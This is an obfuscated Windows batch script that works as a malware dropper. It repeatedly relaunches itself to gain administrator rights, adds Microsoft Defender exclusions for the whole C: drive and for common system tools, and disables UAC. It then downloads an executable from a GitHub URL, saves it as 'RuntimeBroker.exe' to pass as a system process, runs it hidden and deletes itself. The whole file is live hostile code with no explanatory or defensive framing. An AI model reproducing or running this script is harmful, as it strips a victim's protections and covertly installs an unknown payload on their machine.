@echo off & setlocal enableDelayedExpansion
set "nhBcc=NET" & set "WID=2>&1" & set "KNrAC=SESSION" & set "DVJq=>nul"
%nhBcc% %KNrAC% %DVJq% %WID%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "Sepex=foo" & set "gzk=baz" & set "HmM=qux" & set "dCxKp=bar" & rem wVrO gRByihq zGv
set "UdGVg=powershell -ExecutionPolicy Bypass -Command"
set "adI=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "MJyBa='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "PUhg='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!UdGVg! "!adI! !MJyBa! !PUhg!" %DVJq% %WID%
set "kaARx=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "Asc=-Name 'EnableLUA' -Value 0"
!UdGVg! "!kaARx! !Asc!" %DVJq% %WID%
set "ieHbW=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!UdGVg! "!ieHbW!" %DVJq% %WID%
if !errorlevel! neq 0 (goto %a%)
set "qRWh=timeout /t" & !qRWh! 2 %DVJq% %WID%
set "GKhH=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "LjW=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "jCBq=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!UdGVg! "!GKhH! !LjW! !jCBq!" %DVJq% %WID%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!qRWh! 1 %DVJq% %WID% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %DVJq% %WID%
del /f /q "%~f0" %DVJq% %WID%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %DVJq% %WID%
if !errorlevel! neq 0 (!qRWh! 3 %DVJq% %WID% & goto %b%)
exit /b
